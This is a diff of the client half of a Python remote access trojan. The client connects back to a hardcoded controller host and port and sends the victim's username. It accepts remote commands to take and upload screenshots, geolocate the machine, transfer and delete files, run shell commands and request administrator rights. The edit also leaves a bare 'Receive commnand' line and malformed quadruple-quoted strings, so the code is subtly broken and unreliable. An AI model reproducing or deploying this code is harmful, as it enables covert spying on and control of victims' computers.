@@ -7,8 +7,8 @@ github.com/LukasAlstrup/rat
 
 """
 
-debug = True # Use this for debugging: if True print stuff on the terminal if not True do NOT print anything on the terminal
-
+debug = True
+#TODO configure debug mode
 
 import os
 import socket
@@ -22,31 +22,29 @@ import geocoder
 import ctypes
 import sys
 
-
-
+"""Server"""
 port = 8080
 host = "192.168.0.14"
-
 
 s = socket.socket()
 print("[+] Server: ", host, " Port: ", port)
 
-#Connect to the server
+""""Connect to the server""""
 while True:
     try:
         s.connect((host, port))
         break
     except ConnectionRefusedError:
-        print("[-] The server refused the connection. A firewall may be blocking the connection.")
+        print("[-] The server refused to conect. A fireall may be blocking the port")
     except TimeoutError:
-        print("[-] The server did not answer you. Are you lonely?")
-    except:
-        print("[-] Unknown error. Please check your connection...")
+        print("[-] No response from the server")
+    except Exception as e:
+        print("[-] Error while connecting to the server: ", e)
 
 
 print("Connected to the server successfully")
 
-s.send(getpass.getuser().encode()) #Send the username to the client
+s.send(getpass.getuser().encode())
 
 def main():
     def pwd():
@@ -81,18 +79,17 @@ def main():
     def send_files():
         filename = s.recv(6000)
         new_file = open(filename, "wb")
-        data = s.recv(6000) # Change when a file is big
+        data = s.recv(6000)
         new_file.write(data)
         new_file.close()
 
     def screenshot():
-        #Make screenshot and save it to a file called current_screenshot
-        screenshot = pyautogui.screenshot() #Make a screenshot
-        screenshot_path = os.getcwd() + "\current_screenshot.png" #Get a name for the screenshot
-        screenshot.save(screenshot_path)#Save the screenshot
-        screenshot.close() # Close the screenshot
+        """Make screenshot and send it to the target"""
+        screenshot = pyautogui.screenshot()
+        screenshot_path = os.getcwd() + "\current_screenshot.png"
+        screenshot.save(screenshot_path)
+        screenshot.close()
 
-        #Open the file called current screenshot and and read it
         screenshot = open(screenshot_path, "rb")
         data = screenshot.read()
         s.send(data)
@@ -128,41 +125,42 @@ def main():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
     while True:
-        #try:
-        #Receive commnand
-        command = s.recv(1024)
-        command = command.decode()
-
-        #Execute received command
-        if command == "pwd":
-            pwd()
-
-        elif command == "custom_dir":
-            custom_dir()
+        try:
+            """Receive and execute commands"""
             
-        elif command == "geolocate":
-            geolocate()
+            Receive commnand
+            command = s.recv(1024)
+            command = command.decode()
 
-        elif command == "download_file":
-            download_file()
+            if command == "pwd":
+                pwd()
 
-        elif command == "remove_file":
-            remove_file()
+            elif command == "custom_dir":
+                custom_dir()
+                
+            elif command == "geolocate":
+                geolocate()
 
-        elif command == "send_files":
-            send_files()
+            elif command == "download_file":
+                download_file()
 
-        elif command == "screenshot":
-            screenshot()
+            elif command == "remove_file":
+                remove_file()
+
+            elif command == "send_files":
+                send_files()
+
+            elif command == "screenshot":
+                screenshot()
+            
+            elif command == "download_url":
+                download_url()
+            elif command == "cmd":
+                cmd()
+            
+            if command == "get_admin":
+                get_admin()
         
-        elif command == "download_url":
-            download_url()
-        elif command == "cmd":
-            cmd()
-        
-        if command == "get_admin":
-            get_admin()
-        """
         except ConnectionRefusedError:
             print("Connection Refused Error")
 
@@ -177,6 +175,6 @@ def main():
         
         except Exception as e:
             print("[-] Unexptected error: ", e)
-        """
+    
 
 main()
